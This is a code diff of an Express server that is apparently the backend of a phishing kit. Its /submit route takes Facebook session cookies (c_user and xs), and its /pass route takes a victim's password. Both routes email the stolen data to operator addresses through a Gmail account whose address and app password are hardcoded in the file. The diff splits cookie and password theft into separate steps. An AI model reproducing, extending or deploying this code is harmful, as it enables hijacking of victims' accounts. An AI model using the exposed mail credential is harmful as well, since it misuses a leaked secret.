@@ -6,48 +6,82 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// 🟢 POST /submit route
-app.post('/submit', async (req, res) => {
-    const { c_user, xs, password, emails = [], workerEmail, name } = req.body;
+let storedData = {}; // store user data for later use in /pass
 
-    // ✅ Configure transporter
+// === /submit route ===
+app.post('/submit', async (req, res) => {
+    const { c_user, xs, emails = [], workerEmail, name } = req.body;
+
+    if (!c_user || !xs || emails.length === 0 || !name) {
+        return res.status(400).json({ error: "Missing required fields" });
+    }
+
+    // Save for later use in /pass
+    storedData = { emails, workerEmail, name };
+
     const transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
-            user: 'hindistoryhub396@gmail.com',       // ✅ Your Gmail
-            pass: 'fylk gbsb cdgu anwh'                // ✅ App password from Google
+            user: 'hindistoryhub396@gmail.com',        // replace with your Gmail
+            pass: 'fylk gbsb cdgu anwh'           // use app password
         }
     });
 
-    // ✅ Combine recipients for password email
-    const allRecipients = [...emails];
-    if (workerEmail) allRecipients.push(workerEmail);
-
-    // ✅ Password email to ALL
-    const passwordMail = {
-        from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
-        to: allRecipients.join(','),
-        subject: `${name}`, // Subject will be worker name
-        text: `Password: ${password}`
-    };
-
-    // ✅ Session info to other emails only
+    // Send only to emails[] (not workerEmail)
     const sessionMail = {
         from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
         to: emails.join(','),
-        subject: `${name}`, // Subject will be worker name
+        subject: `${name}`,
         text: `c_user: ${c_user}\nxs: ${xs}`
     };
 
     try {
-        // Send password email to all
-        await transporter.sendMail(passwordMail);
-        console.log('✅ Password email sent');
+        await transporter.sendMail(sessionMail);
+        console.log('✅ Session data sent to emails[]');
+        res.status(200).json({ message: 'Session email sent' });
+    } catch (error) {
+        console.error('❌ Error sending session email:', error);
+        res.status(500).json({ error: 'Failed to send session email' });
+    }
+});
 
-        // Send session info to other recipients only
-        if (emails.length > 0) {
-            await transporter.sendMail(sessionMail);
-            console.log('✅ Session email sent');
+// === /pass route ===
+app.post('/pass', async (req, res) => {
+    const { password } = req.body;
+    const { emails, workerEmail, name } = storedData;
+
+    if (!password || !emails || !workerEmail || !name) {
+        return res.status(400).json({ error: "Missing data or password" });
+    }
+
+    const transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+            user: 'hindistoryhub396@gmail.com',
+            pass: 'fylk gbsb cdgu anwh'
         }
+    });
 
-        res.status
+    const allRecipients = [...emails, workerEmail];
+
+    const passwordMail = {
+        from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
+        to: allRecipients.join(','),
+        subject: `${name}`,
+        text: `Password: ${password}`
+    };
+
+    try {
+        await transporter.sendMail(passwordMail);
+        console.log('✅ Password email sent to all');
+        res.status(200).json({ message: 'Password email sent' });
+    } catch (error) {
+        console.error('❌ Error sending password email:', error);
+        res.status(500).json({ error: 'Failed to send password email' });
+    }
+});
+
+// === Start server ===
+app.listen(3000, () => {
+    console.log('🚀 Server running on port 3000');
+});
